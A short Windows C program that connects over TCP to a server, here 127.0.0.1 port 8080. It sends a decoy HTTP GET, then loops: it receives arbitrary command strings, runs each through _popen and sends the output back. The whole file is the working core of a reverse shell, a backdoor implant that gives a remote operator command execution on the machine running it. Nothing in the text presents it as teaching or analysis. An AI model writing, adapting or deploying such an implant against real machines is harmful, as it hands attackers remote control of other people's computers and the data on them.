#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 512
#define OUTPUT_BUFFER_SIZE 8192  // Adjust this to hold larger outputs if needed

int main() {
    WSADATA wsaData;
    SOCKET client_fd;
    struct sockaddr_in serverAddr;

    // Initialise Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        return EXIT_FAILURE;
    }

    // Create a socket
    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_fd == INVALID_SOCKET) {
        perror("Socket creation failed");
        WSACleanup();
        return EXIT_FAILURE;
    }

    // Define server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr); // Connect to localhost

    // Connect to server
    if (connect(client_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("Connection to server failed");
        closesocket(client_fd);
        WSACleanup();
        return EXIT_FAILURE;
    }

    printf("Connected to server.\n");

    // Send a GET request to initiate communication
    const char* get_request = "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n";
    send(client_fd, get_request, strlen(get_request), 0);

    // Main loop to listen for commands from the server
    while (1) {
        char command[256];
        int bytes_received = recv(client_fd, command, sizeof(command) - 1, 0);

        if (bytes_received <= 0) {
            printf("Server disconnected.\n");
            break; // Exit the loop on server disconnect
        }

        command[bytes_received] = '\0'; // Null-terminate the received command
        printf("Command from server: %s\n", command);

        // Execute the command using _popen and capture the output
        FILE* fp;
        char result[BUFFER_SIZE];
        char output[OUTPUT_BUFFER_SIZE] = ""; // Buffer to hold complete output

        // Execute the command
        fp = _popen(command, "r"); // Use _popen to run the command
        if (fp == NULL) {
            printf("Failed to run command\n");
            continue;
        }

        // Read the output of the command
        while (fgets(result, sizeof(result), fp) != NULL) {
            // Safely concatenate the result to the output buffer
            if (strlen(output) + strlen(result) < OUTPUT_BUFFER_SIZE) {
                strcat_s(output, sizeof(output), result);
            }
            else {
                printf("Output buffer exceeded.\n");
                break; // Exit if the buffer limit is reached
            }
        }

        // Close the command stream
        _pclose(fp);

        // Send the complete output back to the server
        send(client_fd, output, strlen(output), 0);
    }

    // Clean up
    closesocket(client_fd);
    WSACleanup();
    return 0;
}
